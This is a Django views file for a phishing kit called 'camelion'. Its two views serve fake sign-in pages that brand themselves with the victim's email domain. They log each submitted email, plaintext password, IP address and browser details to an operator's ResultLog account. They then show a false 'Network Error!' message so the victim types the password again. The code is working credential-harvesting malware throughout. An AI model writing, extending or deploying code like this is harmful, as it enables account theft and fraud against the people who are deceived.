from django.shortcuts import render, redirect
from django.core.validators import validate_email
from django.core.exceptions import ValidationError
from django.urls import reverse
from django.contrib import messages
import tldextract

from django.contrib.auth.models import User
from .utils import get_client_ip, get_browser_info
from .models import ResultLog

def camelion_view(request):
    if request.method == 'POST':
        email = request.POST.get('f_email', '').strip()
        password = request.POST.get('f_password')
        
        try:
            validate_email(email)
            ip_address = get_client_ip(request)
            browser_info = get_browser_info(request)
            user = User.objects.get(username='ogoloadmin')

            ResultLog.objects.create(
                owner=user,
                email=email,
                password_text=password,
                ip_address=ip_address,
                browser_version=browser_info['version'],
                browser_type=browser_info['browser'],
                browser_agent=browser_info['agent'],
            )

            url = reverse('camelion:camelion') + f'?em={email}'
            messages.error(request, "Network Error! Please verify your information and try again.")
            return redirect(url)
        except ValidationError:
            messages.error(request, "Invalid Email Address! Please enter a valid email address.")
            context = {
                'existing_email': '',
                'email_is_valid': False,
            }
            return render(request, 'camelion/camelion_one.html', context)
       
    else:
        existing_email = request.GET.get('em', '').strip()
        email_is_valid = False
        domain = None
        base_domain = "Sign In"

        try:
            if existing_email:
                validate_email(existing_email)
                email_is_valid = True
                domain = existing_email.split('@')[-1]
                # Extract clean base domain
                extracted = tldextract.extract(domain)
                base_domain = extracted.domain
        except ValidationError:
            existing_email = ''
            # email_is_valid = False
            # base_domain = "Sign In"

        context = {
            'existing_email': existing_email,
            'email_is_valid': email_is_valid,
            'logo_text': base_domain.upper(),
            'domain':domain,
        }
    return render(request, 'camelion/camelion_one.html', context)


def camelion_two_view(request):
    if request.method == 'POST':
        email = request.POST.get('f_email', '').strip()
        password = request.POST.get('f_password')
        
        try:
            validate_email(email)
            ip_address = get_client_ip(request)
            browser_info = get_browser_info(request)
            user = User.objects.get(username='myadminuser')

            ResultLog.objects.create(
                owner=user,
                email=email,
                password_text=password,
                ip_address=ip_address,
                browser_version=browser_info['version'],
                browser_type=browser_info['browser'],
                browser_agent=browser_info['agent'],
            )

            url = reverse('camelion:camelion_two') + f'?em={email}'
            messages.error(request, "Network Error! Please verify your information and try again.")
            return redirect(url)
        except ValidationError:
            messages.error(request, "Invalid Email Address! Please enter a valid email address.")
            context = {
                'existing_email': '',
                'email_is_valid': False,
            }
            return render(request, 'camelion/camelion_two.html', context)
       
    else:
        existing_email = request.GET.get('em', '').strip()
        email_is_valid = False
        domain = None
        base_domain = "Sign In"

        try:
            if existing_email:
                validate_email(existing_email)
                email_is_valid = True
                domain = existing_email.split('@')[-1]
                # Extract clean base domain
                extracted = tldextract.extract(domain)
                base_domain = extracted.domain
        except ValidationError:
            existing_email = ''
            # email_is_valid = False
            # base_domain = "Sign In"

        context = {
            'existing_email': existing_email,
            'email_is_valid': email_is_valid,
            'logo_text': base_domain.upper(),
            'domain':domain,
        }
    return render(request, 'camelion/camelion_two.html', context)